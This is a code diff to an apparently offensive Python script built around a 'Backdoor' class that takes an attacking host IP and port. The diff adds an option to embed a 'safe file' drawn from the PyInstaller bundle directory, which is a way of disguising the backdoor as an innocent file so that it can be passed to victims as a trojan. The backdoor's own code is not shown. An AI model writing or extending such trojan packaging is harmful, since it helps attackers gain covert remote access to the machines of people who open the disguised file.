@@ -18,6 +18,8 @@ def get_arguments():
     # arguments
     parser.add_option('-a', '--attacker', dest='attacker', help='Attacking host IP.')
     parser.add_option('-p', '--port', dest='port', help='Port to connect to.')
+    parser.add_option('-f', '--file', dest='file', help='Safe file to embed.')
+
 
     (options, arguments) = parser.parse_args()
 
@@ -100,6 +102,8 @@ class Backdoor:
 
 
 options = get_arguments()
+
+file_name = sys._MEIPASS +'\\' + options.file
 
 try:
     my_backdoor = Backdoor(options.ip, options.port)
